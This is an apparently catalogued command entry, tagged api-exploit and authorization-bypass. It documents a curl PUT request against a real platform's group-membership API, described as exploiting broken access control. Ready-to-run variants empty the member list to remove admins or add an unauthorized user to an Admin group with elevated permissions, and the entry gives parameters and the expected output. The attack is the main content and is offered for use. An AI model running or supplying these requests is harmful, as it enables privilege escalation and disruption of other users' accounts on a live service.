---
id: cmd-uuid-001
name: put-modify-group-members
type: command
executor: bash
data: >-
  curl -X PUT https://hackerone.com/sasas/groups/12307 -H "Content-Type:
  application/json" -H "Cookie: your-session-cookie" -d
  '{"id":12307,"name":"Admin","team_members_count":2,"permissions":["user_management","program_management"],"immutable":true,"team_member_ids":[{"id":"17940"}]}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.299Z'
platforms:
  - Web
tags:
  - api-exploit
  - authorization-bypass
verified: false
validated: true
submitted: true
---

# put-modify-group-members

## Command

```bash
curl -X PUT https://hackerone.com/sasas/groups/12307 \
  -H "Content-Type: application/json" \
  -H "Cookie: your-session-cookie" \
  -d '{"id":12307,"name":"Admin","team_members_count":2,"permissions":["user_management","program_management"],"immutable":true,"team_member_ids":[{"id":"17940"}]}'
```

## Description

This command exploits a broken access control vulnerability in HackerOne's API by sending a PUT request to modify group memberships, allowing removal of admins or addition of unauthorized users. Use it when authenticated to a program to alter the team_member_ids array without proper checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method for updating the group | Yes |
| `https://hackerone.com/sasas/groups/12307` | Target endpoint with group ID (replace 12307 as needed) | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format | Yes |
| `-H "Cookie: your-session-cookie"` | Authenticates the request (replace with actual session cookie) | Yes |
| `-d '{...}'` | JSON payload with group details, including modified team_member_ids | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT https://hackerone.com/sasas/groups/12307 \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"id":12307,"team_member_ids":[]}'  # Empty array to remove all members
```

### Advanced Usage

```bash
curl -X PUT https://hackerone.com/sasas/groups/12307 \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"id":12307,"name":"Admin","permissions":["user_management"],"team_member_ids":[{"id":"unauthorized-user-456"}]}'  # Add unauthorized user
```

## Expected Output

Successful execution returns HTTP 200 OK with JSON like {"id":12307,"name":"Admin",...}, confirming the group update. Failure may return 403 or 500 if session is invalid.

## Related

- [[Related Procedure|procedures/Exploit-HackerOne-Group-Membership-API]]
